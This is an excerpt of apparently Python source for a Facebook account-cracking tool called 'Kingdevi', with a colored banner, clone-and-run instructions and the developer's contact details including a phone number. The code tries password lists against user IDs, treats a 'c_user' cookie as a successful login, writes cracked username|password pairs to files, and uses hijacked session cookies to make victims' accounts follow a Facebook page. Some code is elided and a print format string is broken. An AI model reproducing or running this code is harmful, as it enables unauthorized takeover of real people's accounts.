...
\033[1;91m  o__ __o                                 o   
 \033[1;91m<|     v\                              _<|>_ 
\033[1;91m / \     <\                                   
\033[1;91m \o/       \o    o__  __o    o      o     o   
\033[1;91m  |         |>  /v      |>  <|>    <|>   <|>  
 \033[1;91m/ \       //  />      //   < >    < >   / \  
\033[1;91m \o/      /    \o    o/      \o    o/    \o/  
\033[1;91m  |      o      v\  /v __o    v\  /v      |   
\033[1;91m / \  __/>       <\/> __/>     <\/>      / \  
git clone https://github.com/devixaayat/Kingdevi.git

cd Kingdevi
python king.py                         

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            DEVI
     \033[1;91m➣ \033[1;91mFACEBOOK   :            乛Mʀ Dɘv'ɩ O.oメ
     \033[1;92m➣ \033[1;92mWHATSAPP   :           03263342276
     \033[1;91m➣ \033[1;91mGITHUB     :                devixaayat 
     \033[1;92m➣ \033[1;92mTOOLS      :                 DEVI TOOL
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
"""
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mDEVI_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mDEVI _CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back Devi Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[DEVI -CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [DEVI -OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('DEVI _OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [DEVI -CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('DEVI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/kabsundisb?mibextid=ZbWKwL', cookies={'cookie': coki}).text, 'html.parser')
